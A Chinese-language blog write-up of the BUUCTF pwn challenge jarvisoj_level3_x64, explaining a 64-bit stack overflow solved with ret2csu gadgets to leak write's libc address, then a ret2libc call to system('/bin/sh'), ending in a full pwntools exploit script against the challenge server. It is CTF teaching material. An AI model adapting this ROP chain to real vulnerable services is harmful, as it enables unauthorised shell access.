---
title: "BUUCTF Pwn Jarvisoj_level3_x64"
date: 2020-04-14T15:25:46+08:00
author: NiceSeven
categories:
  - BUUCTF
tags:
  - Pwn
---

# BUUCTF Pwn Jarvisoj_level3_x64

考点

1、64位栈溢出

2、leak地址

3、libc函数地址计算

首先要了解64位函数执行的参数传递，前6个参数是依次传入rdi、rsi、rdx、rcx、r8、r9寄存器的，超出6个的再传入栈中

例如要执行system("/bin/sh\")，首先要把“/bin/sh”地址传入rdi寄存器，然后再call system

要执行write(1,"hello",5)，首先要把1->rdi；"hello\"->rsi；5->rdx，再call write

在rop链中主要是利用pop rdi；pop rsi；pop rdx；ret；等gadget来传参

![image-20200414153627573](/images/image-20200414153627573.png)



本题明显的栈溢出，栈大小为0x80，但是可以读入0x200，但是本题没有system、"/bin/sh\"

所以需要leak出libc地址来计算libc中system()和"/bin/sh\"偏移

思路：

1、栈溢出leak出write或者read地址

2、计算libc基地址

3、栈溢出getshell

前面说过64位的系统函数传参前3个参数要用到rdi、rsi、rdx，但是通过ROPgadget查找缺少了rdx

所以使用wiki里的方法ret2cas

![image-20200414154620068](/images/image-20200414154620068.png)

ret2cas主要是用到如下的两个gadget，通过pop和mov控制rdi、rsi、rdx寄存器，注意0x4006a1-0x4006a4这里有个比较rbx和rbp是否相同然后执行jne跳转的指令段，所以在执行gadget1要构造rbx=0，rbp=1，才不会进入哪个循环的跳转，通过gadget1中的pop r12和0x400699的call r12+rbx*8来控制我们想执行的函数，本题要执行 write来leak所以我们传入r12的值为write_got，这里传入plt好像执行不了具体原因还不清楚，为了满足call r12所以需要rbx=0，这样r12+rbx\*8=r12=write_got => call write_got，参数1传入r15，参数2传入r14，参数3传入r13，这样在执行gadget2之后就会使参数1到3分别mov到rdi、rsi、rdx，也就是64位程序的前3个参数传参顺序

![image-20200414154516403](/images/image-20200414154516403.png)

在构造leak的payload时候需要0x38的数据填充，是因为我们先执行的gadget1，再执行gadget2，但是gadget1在gadget2后面，所以执行完gadget2之后又会执行一遍gadget1，但是gadget1之前执行完已经达到我们的目的了，所以第2遍执行是不需要的，然后看在执行gadget1的时候栈空间是0x7fffffffe100-0x7fffffffe138共0x38的大小，所以这里填充0x38是为了覆盖完这里执行的栈空间，然后覆盖到0x4006b4的ret来使函数返回，因为要执行两次read所以这里使函数返回到main()或者vulnerable_function()，从而再执行一遍read来进行栈溢出getshell

![image-20200414154341039](/images/image-20200414154341039.png)

ida中也可以看栈指针来计算空间大小0x38-0x0=0x38

![image-20200414195512663](/images/image-20200414195512663.png)

```python
#!/usr/bin/env python2
#-*- coding=UTF-8 -*-
from pwn import *      
context.log_level = 'debug'
#sh = process('./jarvisoj_level3_x64')
sh = remote('node3.buuoj.cn',28736)         
elf = ELF('./jarvisoj_level3_x64')
libc = ELF('./ubuntu16-x64-libc-2.23.so') 

rdi_ret = 0x4006b3  
rsi_r15_ret = 0x4006b1
rbx_rbp_r12_r13_r14_r15_ret = 0x4006aa                
mov_rdx_r13_rsi_r14_edi_r15_ret = 0x400690 

fakerbp = 0x8
offset = 0x80 + fakerbp
write_plt = elf.plt['write']
write_got = elf.got['write']
vuln_fun = elf.symbols['vulnerable_function']
#使用wik中的ret2cas通用gadget来leak write地址
payload1 = 'a'*offset + p64(0x4006aa) 
payload1 += p64(0) + p64(1) + p64(write_got) + p64(8) + p64(write_got) + p64(1)
payload1 += p64(0x400690) + 'a'*0x38
payload1 += p64(vuln_fun)
sh.sendlineafter("Input:\n",payload1)
write_addr = u64(sh.recv(8))
#实际地址-libc中的偏移=基址，libc的函数=在libc中的偏移+基址
base_addr = write_addr - libc.symbols['write']
system_addr = libc.symbols['system'] + base_addr
binsh_addr = libc.search("/bin/sh").next() + base_addr
#因为存在pop rdi;ret;所以在getshell的时候直接用
payload2 = 'a'*offset + p64(rdi_ret) + p64(binsh_addr) + p64(system_addr)
sh.sendline(payload2)
sh.sendline('cat flag')
sh.interactive()
```

![image-20200414154115881](/images/image-20200414154115881.png)